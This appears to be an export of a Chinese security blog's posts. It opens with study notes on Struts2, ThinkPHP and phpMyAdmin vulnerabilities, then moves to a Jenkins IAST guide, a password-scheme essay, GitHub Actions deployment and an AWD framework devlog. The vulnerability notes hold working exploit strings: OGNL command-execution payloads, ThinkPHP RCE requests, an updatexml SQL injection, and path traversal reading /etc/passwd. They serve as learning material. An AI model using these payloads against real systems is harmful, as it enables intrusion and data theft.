name=\u0026#34;redirectUri\u0026#34;value=redirectUri /\u0026gt; 或者：\n\u0026lt;@s.hidden name=\u0026#34;redirectUri\u0026#34;value=\u0026#34;${redirectUri}\u0026#34;/\u0026gt; 那么此时，用户输入会先被 Freemarker 解析，随后被当作 OGNL 表达式解析，造成代码执行。\n%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\u0026#39;com.opensymphony.xwork2.ActionContext.container\u0026#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty(\u0026#39;os.name\u0026#39;).toLowerCase().contains(\u0026#39;win\u0026#39;))).(#cmds=(#iswin?{\u0026#39;cmd.exe\u0026#39;,\u0026#39;/c\u0026#39;,\u0026#39;ipconfig\u0026#39;}:{\u0026#39;/bin/bash\u0026#39;,\u0026#39;-c\u0026#39;,\u0026#39;id\u0026#39;})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))} 注意最后必须添加换行符（\\x0a）。\ns2-057 # 参考\n影响版本：2.3 - 2.3.34， 2.5 - 2.5.16\n如果 alwaysSelectFullNamespace 设置为 true 且 action 中未设置 namespace 或直接使用 * ，那么此时的 namespace 由用户控制，并作为 OGNL 表达式解析。\n${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[\u0026#39;struts.valueStack\u0026#39;].context).(#cr=#ct[\u0026#39;com.opensymphony.xwork2.ActionContext.container\u0026#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(\u0026#39;id\u0026#39;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))} ","date":"2020-08-04","permalink":"/posts/struts2/","section":"Posts","summary":"\u003cp\u003e包含 s2-001 / s2-003 / s2-005 / s2-007 / s2-008 / s2-009 / s2-012 / s2-013 / s2-014 / s2-015 / s2-016 / s2-045 / s2-046 / s2-048 / s2-052 / s2-053 / s2-057\u003c/p\u003e","title":"Struts2 漏洞学习"},{"content":"包含 ThinkPHP 5.x RCE / ThinkPHP 5.0.23 RCE / ThinkPHP 2.x RCE / ThinkPHP 5.x SQL 注入导致敏感信息泄露 / phpMyAdmin 4.8.1 远程文件包含 / phpMyAdmin 4.0.x-4.6.2 认证用户 RCE / phpMyAdmin 2.x setup.php 反序列化\nThinkPHP 5.x RCE # 参考\nController 中没有过滤掉 \\，但命名空间恰好需要用到 \\，因此可以调用任意类的方法达到 RCE。\n/index.php?s=/index/\\think\\app/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=printf\u0026amp;vars[1][]=b769a6983b42d565e79bb4f3f534623453f301d39784e57804a649a67ea05327 ThinkPHP 5.0.23 RCE # 参考\n获取 HTTP 请求类型时没有过滤，导致可以调用任意方法，参数为 POST 的数据。因此可以调用 Request 类的构造函数，覆盖其成员属性 method, filter, get，最终调用 call_user_func 实现 RCE。\nPOST /?s=captcha HTTP/1.1 ... _method=__construct\u0026amp;filter[]=printf\u0026amp;method=get\u0026amp;get[]=b769a6983b42d565e79bb4f3f534623453f301d39784e57804a649a67ea05327 POST /?s=captcha HTTP/1.1 ... _method=__construct\u0026amp;filter[]=printf\u0026amp;method=get\u0026amp;server[REQUEST_METHOD]=b769a6983b42d565e79bb4f3f534623453f301d39784e57804a649a67ea05327 ThinkPHP 2.x RCE # 参考\npreg_replace 的 /e 模式允许用户输入的参数被执行，造成 RCE。\nPOST /?s=1/2/3/${eval($_POST[merc])} HTTP/1.1 ... merc=printf(b769a6983b42d565e79bb4f3f534623453f301d39784e57804a649a67ea05327); ThinkPHP 3.0 Lite 模式下同样存在漏洞。\nThinkPHP 5.x SQL 注入导致敏感信息泄露 # 参考\nPDO 查询时如果在查询条件中遇到了 in ，就会遍历传入数组 ids 的 key 和 value，而前者在预编译时并没有进行过滤，可以导致预编译结果出错。在 debug 模式开启时（默认），此时的报错会泄露数据库用户名和密码。\n/index.php?ids[1,updatexml(1,concat(0x7e,md5(1),0x7e),1)]=1 phpMyAdmin 4.8.1 远程文件包含 CVE-2018-12613 # 参考\n代码中存在文件包含，只需要绕过条件判断中的白名单。判断函数利用 ? 截断 GET 参数，并且还会进行 URL 解码，因此利用二次 URL 编码 %253f 即可绕过白名单，同时读取任意文件。\n/index.php?target=db_sql.php%253f/../../../../etc/passwd 随后，执行 select \u0026lt;?=phpinfo()?\u0026gt;;，抓包获取当前 session，随后访问 session 文件即可执行对应 php 代码：\n/index.php?target=db_sql.php%253f/../../../../tmp/sess_1ee714d1373e5caad9faf122e9ad1798 phpMyAdmin 4.0.x-4.6.2 认证用户 RCE CVE-2016-5734 # 实际影响版本：\n4.0.x \u0026lt; 4.0.10.16 4.4.x \u0026lt; 4.4.15.7 4.6.x \u0026lt; 4.6.3 参考\n这个问题实际上是 PHP 5.4.7 的 preg_replace 函数的问题。当使用类似如下代码时：\npreg_replace(\u0026#39;/\u0026#39;.$user_input.\u0026#39;/i\u0026#39;, $replace, $text); 我们可以输入 /e\\0 来注入 /e 修饰符，同时截断后面的内容来达成 RCE。\n在 phpMyAdmin 中利用这个漏洞，需要知道系统的用户名密码：exp\nphpMyAdmin 2.x setup.php 反序列化 # 参考\n在 /scripts/setup.php 中没有对 configuration 参数进行过滤就进行了反序列化，因此可以注入一个 PMA_Config 对象，在构造函数中引入其成员变量 source 并通过 eval 执行。既可以读取文件，也可以通过已有文件执行代码。\n以读取 /etc/passwd 为例：\n\u0026lt;?php class PMA_Config { public $source = \u0026#34;/etc/passwd\u0026#34;; } $data = new PMA_Config(); echo serialize($data); ?\u0026gt; 运行可以得到：\nO:10:\u0026#34;PMA_Config\u0026#34;:1:{s:6:\u0026#34;source\u0026#34;;s:11:\u0026#34;/etc/passwd\u0026#34;;} 之后可以进一步通过 ftp 协议写 shell。\n","date":"2020-07-29","permalink":"/posts/think-php-myadmin/","section":"Posts","summary":"\u003cp\u003e包含 ThinkPHP 5.x RCE / ThinkPHP 5.0.23 RCE / ThinkPHP 2.x RCE / ThinkPHP 5.x SQL 注入导致敏感信息泄露 / phpMyAdmin 4.8.1 远程文件包含 / phpMyAdmin 4.0.x-4.6.2 认证用户 RCE / phpMyAdmin 2.x setup.php 反序列化\u003c/p\u003e","title":"ThinkPHP \u0026 phpMyAdmin 漏洞学习"},{"content":"工作中写的一份指南文档。由于用的是测试环境，并没有需要脱敏的地方。\n环境准备 # 之前 XXX（同事名）已经按照 DevSecOps Studio 中的说明搭建好了 DevSecOps 的基本环境，可以从他那里拷贝一份。由于我们演示时只需要用到 GitLab 和 Jenkins 两个虚拟机，其它的可以不用拷贝。大小在 11G 左右。\n拷贝完成后，目录结构大致如下：\n这里的 2200 , 2201 是配置端口转发后，两个虚拟机的 ssh 服务在本机上的对应端口，可以不用更改。\n创建虚拟机 # 这一部分的操作对 GitLab 和 Jenkins 都需要做。\n在创建虚拟机前需要先修改 .vbox 文件的配置，用文本编辑器打开 .vbox 文件，搜索 \\Users\\neoo\\gitool\\，替换为你电脑上存放 DevSecOps-Studio 的目录（绝对路径）。例如我的电脑上是：\n实际上，只需要保证文件 ubuntu-xenial-16.04-cloudimg-console.log 和 gitlab-2201 文件夹处于同一目录下。\n随后打开 VirtualBox ，点击 工具 -\u0026gt; 注册 并选择对应的 .vbox 文件，即可导入两个虚拟机：\n配置虚拟机 ssh（可选） # 这一部分的操作不是必需的。\n进入虚拟机设置界面，点击 网络 -\u0026gt; 高级 -\u0026gt; 端口转发 ，就可以将虚拟机的 ssh 端口映射到本机。正常情况下，此时已经映射到了 2200/2201 端口。\n接下来，需要启动虚拟机，用 vagrant/vagrant 登录，并运行：\nsudo vim /etc/ssh/sshd_config 将 52 行改为：\nPasswordAuthentication yes 最后运行：\nsudo service sshd restart 这样就可以通过本机的 ssh 客户端连接虚拟机了：\n网络配置 # 默认情况下，Jenkins 和 GitLab 都采用 NAT 模式，此时我们本机是无法 ping 通虚拟机的。为了后续操作方便，我们可以将 GitLab 设置为桥接模式，即在 网络 -\u0026gt; 连接方式 中选择桥接网卡。\n此时再启动 GitLab，用 vagrant/vagrant 登录，并运行 ifconfig | more ，可以看到桥接模式下的 IP 地址，这个地址对我们本机而言是可达的。\n如图所示，GitLab 虚拟机的 IP 为 192.168.0.109。\n桥接模式下就不需要端口转发了。此时 ssh 连接的目标也变成 192.168.0.109:22。\n由于 GitLab 的服务运行在 443 端口，此时直接访问 https://192.168.0.109 是可以看到 GitLab 界面的。当然，也有可能是如下界面：\n这种情况下一般只需要多等待一会儿就好了。\n之所以采用桥接模式，是为了配合解析 GitLab 内置的域名 gitlab.local。现在只需要修改本机 hosts 文件，让 gitlab.local 解析到 192.168.0.109 即可。\n访问 https://gitlab.local，应该能得到正常的 GitLab 登录页面了。\n默认情况下 Jenkins 虚拟机应该能够解析 gitlab.local 域名，如果后面设置 Jenkins 时遇到域名解析问题，请检查 Jenkins 虚拟机的 /etc/hosts 文件。\n如果需要信任 GitLab 的自签名证书，可以先 cd /etc/gitlab \u0026amp;\u0026amp; sudo mv ssl/* ./，然后将 gitlab.local.crt 通过 SFTP 下载到本机并导入到受信任的根证书颁发机构里。\nGitLab 配置 # 注册账号、登录、创建新的公开 repo。在本地准备一个 Java Web 应用，我使用的是 java-sec-code 这个项目。\n如果使用其它项目，请确保可以在 Java 6/7/8 中的至少一个运行环境上运行。原因： 随后删除原项目目录下 .git 目录（如果你对 git 比较熟悉也可以不删除），运行（项目名需自行替换）：\ncd java-sec-code git init git remote add origin https://GitLab.local/merc/java-sec-code.git git add . git commit -m \u0026#34;Initial commit\u0026#34; git push -u origin master 即可将项目推送到 GitLab 上。期间遇到的问题请参考 Git 文档。\nJenkins 配置 # 首先配置端口转发，将虚拟机 8080 端口映射到本机的任意未占用端口，如 8008：\n然后访问 http://localhost:8008/ ，即可看到 Jenkins 页面。\n接下来，按照 雳鉴 IAST 第三方插件帮助文档 一步步配置 Jenkins。需要注意的几点：\n雳鉴中提供的 Jenkins 插件可能存在兼容性问题，请务必使用修改后的 IAST.hpi 文件代替。\n第二步中 IAST 服务器地址 请填写公网雳鉴地址，即 http://47.100.14.22:81/。\n第三步结束后，先如图配置好 repo 地址（项目名需自行替换）：\n第四步中 被测站点地址 即部署 Java Web 应用的服务器地址，形式一般是 ip:port。\n在第五步前，请先在服务器上部署好 Java Web 应用并运行，防止雳鉴中项目创建失败。例如我的应用是基于 Springboot 的，只需要运行 java -jar java-sec-code-1.0.0.jar 即可。\n在构建完成后，预期结果是在雳鉴中创建了新的项目。但是扫描结果中是没有漏洞的，因为还没有进行插桩：\n进行插桩扫描 # 进入新创建的项目详情页面下载 agent，然后 SFTP 传到服务器上。根据 雳鉴 IAST 插桩 agent 帮助文档来部署 agent。例如对于我的 Springboot 应用，只需要运行：\njava -javaagent:./iast_agent.jar -jar java-sec-code-1.0.0.jar 待项目启动后，通过浏览器访问 Java Web 应用，即可在项目详情页面看到已经启动的 agent 了。\n插桩扫描是基于流量的，因此只有发送请求后才能检测到 agent。\n接下来对要测试的功能点发送请求即可进行扫描。例如对于存在 SSRF 漏洞的功能点发起请求：\n在雳鉴界面中可以看到：\n这时回到 Jenkins 再次进行构建，就可以得到正确的扫描结果了：\n附录 # 内网（仅主机网络下） IP： Jenkins：10.0.1.11 GitLab： 10.0.1.15 相关目录： Jenkins：/var/lib/jenkins，项目目录位于 jobs 下 GitLab：/etc/gitlab，配置文件为 gitlab.rb 在 Jenkins 中删除一个项目后，重新创建新项目前建议运行 rm -rf /var/lib/jenkins/jobs/jobs ","date":"2020-07-28","permalink":"/posts/jenkins-iast/","section":"Posts","summary":"\u003cp\u003e工作中写的一份指南文档。由于用的是测试环境，并没有需要脱敏的地方。\u003c/p\u003e","title":"稳中求进：Jenkins 集成 IAST 全流程"},{"content":"就算无法逃避社工，也要设法减少损失。\n最近又心血来潮把所有重要账号的密码改了，在这个过程中产生了很多想法，记录一下。\n常识 # 我们知道，尽管扫码登录、手机验证码登录已经十分普及，传统的账号 + 密码依然是主流的登陆方式。为了避免和密码学术语混淆，这里说的 “密码” 实际上指的是“口令”。如今应该不会再有人用类似 123456 这样的口令了，然而在渗透过程中，我发现许多用户、乃至许多系统的口令依然只是做到了比 123456 强一些而已。因此，关于口令的设置，首先需要明确一些常识。\n攻击 # 站在攻击者角度，如果他想要窃取你的口令，一般会如何下手呢？最常见的方法不外乎暴力破解和字典攻击两种。\n暴力破解 # 如果攻击者已经知道你的口令是 6 位纯数字，那么他的思路就非常简单：从 000000 到 999999 逐一尝试直到成功为止；如果是 6 个字母组成的单词，那就枚举每一位上的 26（52）种可能性。只要时间够长，这种方法总能成功，然而问题在于当口令的长度和字符集增长时，暴力破解所需要的时间代价也飞速增长，使得这种方法在大部分场景下没有什么实用价值。为了缩小枚举的空间，攻击者常常选择另一种手段类似的方法：字典攻击。\n字典攻击 # 假设你的口令是上面说的 6 个字母组成的单词，攻击者可以靠查字典来大大缩小需要枚举的范围————毕竟，许多 6 字母组合并不能构成单词。当然，这么说是一种简化的情况。实际场景下的字典攻击，是攻击者先准备一本 “口令字典”，然后只枚举在这本字典上出现过的那些口令。问题在于攻击者如何制定这本字典来提升成功率的。\n这里就利用了人们为了方便记忆，总是使用与个人信息相关的口令这一现象。个人信息泄露在这个时代已经是家常便饭，因此通过一些信息收集手段，从某一个人的一个虚拟账号查到其真实身份及个人信息并非难事。这种手段被称为社会工程学，而被攻击者的口令很有可能就在由此定制出来的字典中。\n防御 # 那么作为防御者，我们需要考虑的也就是如何抵抗这两种攻击。抵抗暴力破解非常容易：\n口令尽可能包含大写字母、小写字母、特殊符号、数字中的至少 3 种 口令长度不能太短，一般至少需要在 8 位以上 我们不妨称满足这两个条件的口令为爆破安全的。\n然而字典攻击就没那么容易防了，因为安全是方便的敌人：与个人信息相关的口令容易记住，却也容易被字典攻击破解；与个人信息无关的、毫无规律的复杂口令很难被字典攻击破解，但却很难记。这一矛盾在撞库攻击下更为突出。\n撞库攻击，即攻击者获取到某人在某一网站上的口令（明文）后，用同样的口令尝试登录同一人在其它网站上的账号的攻击手段。\n这种攻击的存在提醒我们：\n对于不同的网站账号应设置不同的口令，且每个口令都需要是爆破安全的 满足这样的安全性要求，可能会使一个人的口令非常难以记忆和管理。因此，许多人开始选择使用口令管理工具来存储和自动填充那些设置得十分复杂的口令。这是一种不错的办法，然而由于对一些口令管理工具安全性的担忧、以及在多个平台上装同一款软件的抵触，我依然倾向于依赖自己小小的灰色细胞。下面要介绍的，就是如何设计一套既便于记忆、又足够安全的口令方案。\n需求 # 在开始之前，先来看一下我们设计方案的需求：\n对于任意两个不同的网站，方案产生的两个口令相同的概率是可忽略的 对于任意一个特定的网站，在没有纸笔、计算器等任何辅助工具的情况下，可以在较短时间内（例：10 秒内）得到完整的口令 所有产生的口令都是爆破安全的 实际上对于 “可忽略”、“较短时间” 都可以进行数学定义，这里就不赘述了。\n方案设计 # 以生于 1975 年 6 月 2 日的张三为例，我们如何为他设计一套口令方案呢？\n不可变部分 # 从最简单易记的名字 + 生日方式（也是很多人在用的方式）开始，我们首先获得了基础口令：\nZS19750602 这样的口令显然太弱了。我们可以对其应用适当的变换，例如用 k=6 的凯撒移位：\n`Y7?=;6\u0026lt;68 具体应用哪种变换，取决于张三的脑洞、以及什么样的变换方式对张三来说比较容易计算。比如，他同样可以用一种规律比较杂的变换得到：\n52I6_\\2O905 这里涉及到将字符垂直翻转、以及一些形状相近字符的互换等操作。这次生成的字符串和原字符串长度也不相同。\n总之，通过将容易记忆的（与个人信息相关的）字符串进行一种容易计算的变换，我们可以轻松生成口令的不可变部分。\n可变部分 # 而可变部分取决于该口令所属的具体网站。以 QQ 为例，我们可以用类似 qq / icq / imqq 等作为网站的特征。随后对网站特征进行变换，例如 qq 可以变换为 9g / 11371 / 1wwa 等（分别用了形似字替换、ASCII、键盘等规律进行变换）。这里需要注意的是对于同样的字符 q 应该变换出不同的结果，并且这里的变换方式不应与不可变部分的变换方式相同。\n这样，通过提取网站特征并进行另一种容易计算的变换，我们得到了口令的可变部分。\n那么张三最终的 QQ 口令就可以是：1wwa52I6_\\2O905。当然还可以加一些连接符，如 1wwa\u0026amp;52I6_\\2O905。\n由于在上述步骤中，采用的变换、网站特征、原字符串都需要选取容易记忆的，我们可以确保该口令方案也是容易记忆的。问题是，这样的方案足够安全吗？\n安全性分析 # 从密码学角度，这样的方案是不安全的，因为其核心就是 * Security through Obsecurity*，这是违反 Kerckhoff 准则的。而且，这样的方案缺乏随机性，不可能是安全的。然而随机性恰恰是记忆的最大敌人，这使得我们不能在方案中引入随机性。\n不过对于个人使用而言，可以认为该方案足够安全。在分析方案安全性之前，我们不妨先讨论一些安全的定义。\n定义 # 为了定义一种口令方案 “有多安全”，我们可以站在攻击者的角度：攻击者为了获取口令所需要付出的代价越大，那么可以说这种口令方案越安全。不妨称攻击者为 A，被攻击者为 B，下面就给出一些攻击者具备不同能力时的场景：\n弱社工攻击：A 只能获取到关于 B 的一些基本社工信息，如姓名、生日、证件号码等，尝试获取 B 在随机某一网站上的口令 强社工攻击：A 有能力获取到任何与 B 有关的社工信息的每一个细节（A 比任何一个熟悉 B 的人更熟悉 B），尝试获取 B 在随机某一网站上的口令 已知口令攻击：上述基础上，A 有能力获取 B 在随机某一网站上的口令，尝试获取 B 在指定网站上的口令 选择口令攻击：上述基础上，A 有能力获取 B 在指定网站上的口令，尝试获取 B 新注册的网站上使用的口令 讨论 # 可以看到，攻击者的能力是递增的。由于经过变换，口令看起来与社工信息无关，这足以保证口令不会出现在攻击者构造的字典中，使得强社工攻击难以成功；对于已知口令攻击和选择口令攻击，攻击者需要对获得的口令进行分析，以掌握口令方案中采用的两种变换、网站特征、原字符串————后两者不难猜解，而安全性的核心，即采用的两种变换如果选取得当，在已知口令攻击下是极难猜解的。这是因为已知口令情景下攻击者还需要区分可变和不可变的部分。\n而对于选择口令攻击，攻击者可以很容易得到不可变的部分，那么最后的挑战就仅仅在于猜解两种变换。此时两种变换的设计就极大程度决定了方案的安全性。由于更安全几乎总是意味着更难以记忆，这里的设计可以根据个人需要来调整。如果使用类似凯撒移位这种变换，想要抵抗选择口令攻击是比较勉强的。\n不过话说回来，选择口令攻击确实是极端的情景————因为此时攻击者必须要掌握你所有网站上的口令才行。现实中的撞库攻击一般更接近已知口令攻击，而我们的方案可以很好地抵御这类攻击情景。\n总结 # 我们可以这样设计既容易记忆、又能抵抗常规情景下字典攻击的口令方案：变换 1(网站特征) || [连接符] || 变换 2(可能与个人信息相关的字符串)；这种方案本质上是一种将 可能与个人信息相关的字符串 这类弱口令与 网站特征 关联从而生成动态强口令的方案。\n","date":"2020-07-17","permalink":"/posts/shred-dict/","section":"Posts","summary":"\u003cp\u003e就算无法逃避社工，也要设法减少损失。\u003c/p\u003e","title":"粉碎字典：设计方便记忆的安全口令"},{"content":"最近在搞 SDL，尝试了一下 CI/CD 。\n背景 # 在开发 pAssWD 的过程中，我发现每次开发到一个阶段，需要给别人展示效果的时候，总是需要经过几个不算太麻烦但是固定的步骤：\n运行 npm run build 将服务器上原来的 spa 文件夹删除 把 dist/spa 目录通过 SFTP 上传到服务器 在 spa 目录下起一个 http 服务 这些步骤连可变的参数都没有，非常适合自动化。恰好最近实习时的 SDL 项目也需要我对 CI/CD 有所了解，于是我从 pAssWD 项目开始着手实施 CI/CD 流程。\nGithub Actions # 我听说了不少持续集成工具，如 Jenkins, Travis 等，但由于代码放在 GitHub 上，考虑到可以和 GitHub Pages 联动，我选择了 GitHub Actions 来实现。\nGitHub Actions 非常友好的一点在于，可以直接把 GitHub 上其他开发者编写好的 actions 拿来用，并且 actions 用到的 workflow 文件是优雅的 yaml 格式，可以说对我这种新手来说非常容易入门。\n首先创建 .github/workflow/ 目录用来存放不同的 workflow 文件，比如我们新建一个 build.yaml：\nname: build on: push: branches: [master] pull_request: branches: [master] name 即该 workflow 的名称，on 表示什么时候触发 Actions，在上述例子中，只有对 master 分支进行 push 或者 PR 的时候才会触发 Actions。\njobs: build-and-deploy: runs-on: ubuntu-latest steps: # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it - name: Checkout uses: actions/checkout@v2 # Runs a single command using the runners shell - name: Build and Deploy uses: JamesIves/github-pages-deploy-action@master env: ACCESS_TOKEN: ${{secrets.ACCESS_TOKEN}} BRANCH: gh-pages FOLDER: dist/spa BUILD_SCRIPT: npm install \u0026amp;\u0026amp; npm run build 接下来定义 jobs，这里我们只有一个 job 也就是 build-and-deploy。对于这个 job，我们首先分配一个 runner，即运行这些 Actions 的虚拟机。这些虚拟机是 GitHub 托管的，当然根据文档也可以使用自己的 runner。这里选择了最新的 ubuntu 系统。\n然后定义要做的一系列步骤，每个步骤都可以有自己的 name。第一步一般先要 checkout 到自己的这个 repo 下，我们不用关心具体是怎么 checkout 的，因为有 actions/checkout@v2 帮我们管理了这些步骤。同样的，第二步我们在部署到 Pages 时同样无需关心细节，直接使用了一个部署到 Pages 的 action。\n这里需要配置一些参数，首先是个人的 GitHub Token，在 Settings-\u0026gt;Developer Settings 中可以生成。这是因为在我们用的这个 action 中需要调用 GitHub 的 API，因此需要一个认证 token。注意该 token 需要保密，因此放在项目的 Settings-\u0026gt;Secrets 里。然后是要部署的分支、部署文件的目录、构建时要执行的命令等，都很容易理解。\n至此，build.yaml 写完了，我们可以尝试 push 一下，然后在 Actions 页面就能看到已经自动运行的 build 流程了。\n如果遇到了问题，也可以直接展开每一步来查看命令行的输出。\n至此就实现了简单的持续部署，也就是 CD 流程。CI 流程类似，不过 pAssWD 的体量不大（我懒得写测试）就没有写测试，于是 CI 这里就没有演示了。\n注：实际上，由于我部署到 GitHub Pages，而网站上已经有内容了（就是这个博客），因此实际上是部署到了 http://blog_url/pAssWD 下。为此需要修改 package.json 新增一个 homepage 字段。由于绑定了自己的域名还需要在根目录放一个 CNAME 文件，就像这个博客的 repo 一样。\n","date":"2020-07-16","permalink":"/posts/github-actions-cd/","section":"Posts","summary":"\u003cp\u003e最近在搞 SDL，尝试了一下 CI/CD 。\u003c/p\u003e","title":"闻鸡起舞：利用 GitHub Actions 进行持续部署"},{"content":"Platform for Attacking Swiftly \u0026amp; Smoothly With Defending\npAssWD 简介 # 我和两位研究生学长在打了几次 AWD 比赛后，深深体会到了经验和工具对这种比赛模式的巨大帮助。前者只能靠多参加比赛来积累，后者却是可以自己逐步收集的。为了在 AWD 比赛中发挥地更加出色，我们开始搭建自己的 AWD 框架，我给它起了个有趣的名字：pAssWD (Platform for Attacking Swiftly \u0026amp; Smoothly With Defending)。\n我们相信，这一框架将改善我们的 AWD 比赛体验。\n开始开发 # 项目基于我们已经收集到的一些 python 脚本。考虑到兼容性问题，统一版本为 Python 2.7。为了增加灵活性和可移植性，我们采用前后端分离开发。这样我不仅可以做 web 端，还可以构建跨平台的 Electron 桌面端。最终分工为两位学长负责后端开发，我负责前端开发。\n技术架构 # 前端 Quasar Framework (Vue.js) 后端 Flask (Python) Tornado (Python) 需求 # 通过交流确定了一些尚不成熟的需求，这里仅包含核心功能：\n登录与认证 配置比赛信息和靶机信息 文件上传与共享 实时读取并显示系统日志与靶机日志 备份 web 目录 解压本地备份文件并查杀后门 根据后门生成混淆 payload 根据攻击日志生成 payload 自动化攻击 区分不同语言文件 java 流量记录 开发初期 # Login # 首先是登录功能（注册比较简单），后端采用 HTTP Basic Auth 配合 jwt 进行认证。因此我使用 axios 模块 config 中的 auth 这个字段来设置 Basic Auth 内容。那么登录时的代码就类似：\nthis.$axios.get(\u0026#34;token\u0026#34;, { auth: { username: this.username, password: sha256(this.password), }, }); 这里对密码进行了哈希后发送，方便直接存储到数据库，同时避免明文传输。\n随后会收到一个 jwt，我需要做的就是将该 jwt 进行 base64 后，拼接到 Basic 后面并填入 HTTP 请求头 Authorization 中。考虑到之后的所有请求都需要这一步，我将该过程放在了请求拦截器中：\n// http basic auth Vue.prototype.$token = () =\u0026gt; { let state = JSON.parse(sessionStorage.getItem(\u0026#34;store\u0026#34;)); if (state) { let info = state.userInfo; if (info) { return \u0026#34;Basic\u0026#34; + Base64.encode(info.token + \u0026#34;:\u0026#34;); } return \u0026#34;\u0026#34;; } }; Vue.prototype.$axios.interceptors.request.use( config =\u0026gt; { config.headers.Authorization = Vue.prototype.$token(); return config; }, err =\u0026gt; { Promise.reject(err); } ); 这里维护登录状态的方式一如既往，将 store 整个存入 sessionStorage，页面刷新时取回。\n完成了请求拦截器的设置，就可以保证登录后发出的请求都带有认证 token 了。\n顺带一提，注册功能虽然实现了，但是并没有在 UI 中直接开放。我们认为实际使用中该功能没有必要，因此仅仅用来调试。\nSettings # 这个部分技术上其实没有太多突破，主要时间花在沟通上了。最初没有考虑不同比赛的问题，因此 Settings 页面直接放了靶机设置。但是引入不同比赛后，每个比赛都有自己的靶机，因此分出了一个 Competition 页面用来对比赛进行详细设置，包括设置靶机。\n首先遇到的问题是，由于设置了表单验证，在填写 ssh 信息时如果空着会触发提示，就像这样：\n然而文本框内部右侧多出来的警告图标会导致文本框的长度被改变，从而改变同一行内其它元素的位置。我的解决方案是设置小于原宽度的 max-width，使得文本框长度固定。\n然后需要对靶机信息进行增删改查，界面大概是这样的：\n这里的问题在于当点击保存后，有可能向数据库插入所有数据，即使其中有一部分已经存在。因此后端多发送了一个 id 字段，前端点击保存发送数据时，如果某条数据没有 id，说明不在数据库中，是新增的数据；否则就是已有数据，正在进行修改。\n类似的问题出现在删除上。点击加号后界面上会多出一行靶机信息，但还没有持久化到数据库里。如果这时候点击删除，那么是不需要和后端交互的。然而如果是对数据库中已存在的数据点击删除，则需要发送请求了。怎么区分这两种情况呢？答案是一样的，借助上面提到的 id 字段。\n接下来花了很长时间做浏览器端的 ssh，经过一段时间的选型最终决定后端采用基于 tornado 的 webssh，前端采用 xterm.js 来进行交互，协议是 websocket。连接 webssh 的过程比较复杂，因此我画了一张图来让自己理解：\n在这个部分上我们花了如此多的时间，以至于最后看到这个界面时，我们都长舒了一口气：\n本来还以为要用别的办法来连接 ssh 了。这都要感谢 webssh 项目支持通过 api 方式登录。\nwebssh 的速度比我想象的快。\n最后在这个部分又花了些时间讨论 ssh 页面加侧边栏和 “一键” 系列功能的事情，不过后来移动到别的板块了。\nSharing # 这里就是文件上传、下载、获取文件列表的功能，没有什么难度。不过在把脚本上传到靶机时，耗时比较长，因此添加了 loading 的标识来改善用户体验。\n在这一阶段的开发中我们开始通过 api_doc.md 来沟通，大体上就是一个 api 列表和 todolist 的结合：\n- auth.py: - [x] /api/users/reg - methods=[\u0026#39;POST\u0026#39;] - recv: `{username,password}` - return: `{data:{username}}` - [x] /api/users/\u0026lt;int:id\u0026gt; - methods=[\u0026#39;GET\u0026#39;] - recv: `id` - return: `{data:{username}}` - [x] /api/token - methods=[\u0026#39;GET\u0026#39;] - recv: Basic Auth (`username,password`) or (`\u0026#34;username\u0026#34;:token,\u0026#34;password\u0026#34;:any`) - return: `{data:{token,username,duration}}` - [x] /api/resource - methods=[\u0026#39;GET\u0026#39;] - recv: Basic Auth - return: `{data:\u0026#34;Hello, %s!\u0026#34;% username}` 选择这种方式是因为 flask 的 swagger 插件需要重构代码……\n在这个部分，第一次出现需要获取当前比赛的所有靶机信息的需求。后来我将这个功能封装成了一个异步函数：\n// get current gameboxes Vue.prototype.$getTargets = async function () { let curComp = await this.$axios.get(\u0026#34;get_current_game\u0026#34;).then(res =\u0026gt; { if (res) { return res.data.data; } }); if (!curComp) return []; return this.$axios.get(`get_ssh/game/${curComp}`).then(res =\u0026gt; { if (res) { return res.data.data; } }); }; 顺便学了下 async/await 用法。之前对 await 有些误解，实际上这里的 await 仅仅保证 curComp 在后续使用时已经接收到了 Promise 对象 resolve 的值，异步调用依然是异步调用。\nBacking up # 这个部分基本都是后端的活。不过目前，查杀后门和 web 应用识别两个功能虽然已经测试成功，但是还没有想好对应的 UI 怎么做。\nLogging # 这是花费时间最长的部分，主要是由于中间一段时间我和后端同学空闲时间总是错开、以及引入 SSE 后后端出了很多错误。\n日志记录分为两个部分，pAssWD 系统的日志以及每个靶机自己的日志。靶机日志又分为 web 日志和 attack 日志，后者是前者的真子集，仅包含了被认为是恶意攻击的日志。这里首先需要新日志的消息提醒，最初想通过 websocket 来做，后来采用了更轻量级的 SSE。\n前端进行消息提醒的逻辑很简单：登录时建立 SSE 连接，收到新日志时，Vuex 维护的 logs 变量就 + 1。这会导致 Logging 侧边栏出现红点，而当点进 Logging 页面后红点就会消失。\n之后就是在 Logging 页面通过 API 获取日志列表。其中 message，param，data 三项由于各种原因（长度过长、格式变化太多），我选择在每条日志的最后让用户点击按钮自行查看 json 格式的数据。如图：\n中间出现了一些沟通上的问题，大多围绕数据格式、数据获取方式等问题。主要是因为我不熟悉后端的实现、后端也不熟悉前端的一些原理导致的。\n最后就是如何让用户不刷新页面也能接收新日志的问题了。目前和后端讨论下来，虽然后端已经给出了一种解决方案，暂时还是将该功能的开发延后到开发中期。\n日志这一块还有一些问题没有解决，将在后续和实时接收日志功能一起解决。解决这些问题需要的时间，估计不少于我们在 webssh 问题上花费的。\n开发中期 # 2020 年 6 月 27 日，pAssWD v0.1.0 发布，标志着开发初期的结束。目前 pAssWD 已经可以在 AWD 赛事中起到一定作用了。同一天又发布了 v0.1.1，修复了由于代码优化导致的 bug。\n中期开始写 CHANGELOG，学习了像 SemVer, 